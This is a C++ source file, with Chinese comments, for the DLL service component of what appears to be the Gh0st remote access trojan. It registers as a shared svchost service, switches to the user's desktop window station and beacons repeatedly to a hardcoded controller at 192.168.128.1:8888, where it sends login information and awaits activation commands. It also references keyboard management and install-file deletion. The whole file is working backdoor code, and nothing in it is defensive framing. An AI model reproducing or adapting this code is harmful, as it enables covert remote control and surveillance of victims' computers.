// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/KernelManager.h"
#include "common/install.h"

extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);

enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};


DWORD WINAPI main(char* lpServiceName);


char  g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

char	svcname[MAX_PATH];
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

// 一定要足够长
DWORD WINAPI main(char* lpServiceName)
{
	// lpServiceName,在ServiceMain返回后就没有了
	char	strServiceName[256];
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;

	strcpy(g_strHost, "192.168.128.1");
	g_dwPort = 8888;

	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////


	if (CKeyboardManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);
		//ResetSSDT();

		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // 随机事件名

		hInstallMutex = CreateMutex(NULL, true, g_strHost);
		//ReConfigService(strServiceName);
		// 删除安装文件
		//DeleteInstallFile(lpServiceName);
	}
	

	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	char* lpszHost = NULL;
	DWORD	dwPort = 80;
	//char* lpszProxyHost = NULL;
	//DWORD	dwProxyPort = 0;
	//char* lpszProxyUser = NULL;
	//char* lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}

		// 上线间隔为2分, 前6个'A'是标志
		//if (!getLoginInfo(MyDecode(g_strHost + 6), &lpszHost, &dwPort, &lpszProxyHost,
		//	&dwProxyPort, &lpszProxyUser, &lpszProxyPass))
		//{
		//	bBreakError = GETLOGINFO_ERROR;
		//	continue;
		//}

		lpszHost = g_strHost;
		dwPort = g_dwPort;

		//if (lpszProxyHost != NULL)
		//	socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		//else
		//	socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复卓面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
}



//extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
//定义导出函数:
extern "C" __declspec(dllexport) void TestRun(char* strHost, int nPort)
{
	strcpy(g_strHost, strHost);  //保存上线地址
	g_dwPort = nPort;             //保存上线端口
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		//CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		//CKeyboardManager::Initialization();
		break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwCurrentState = g_dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 1000;
	return SetServiceStatus(hServiceStatus, &srvStatus);
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
	// not really necessary because the service stops quickly
	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		Sleep(10);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;
	case SERVICE_CONTROL_PAUSE:
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;
	case SERVICE_CONTROL_CONTINUE:
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM(g_dwCurrState, 0, 0);
		break;
	}
}


extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
	wcstombs(svcname, argv[0], sizeof svcname);
	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
	if (hServiceStatus == NULL)
	{
		return;
	}
	else FreeConsole();

	TellSCM(SERVICE_START_PENDING, 0, 1);
	TellSCM(SERVICE_RUNNING, 0, 0);
	// call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	do {
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	} while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (g_dwServiceType == 0x120)
	{
		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
		while (1) Sleep(10000);
	}
	return;
}
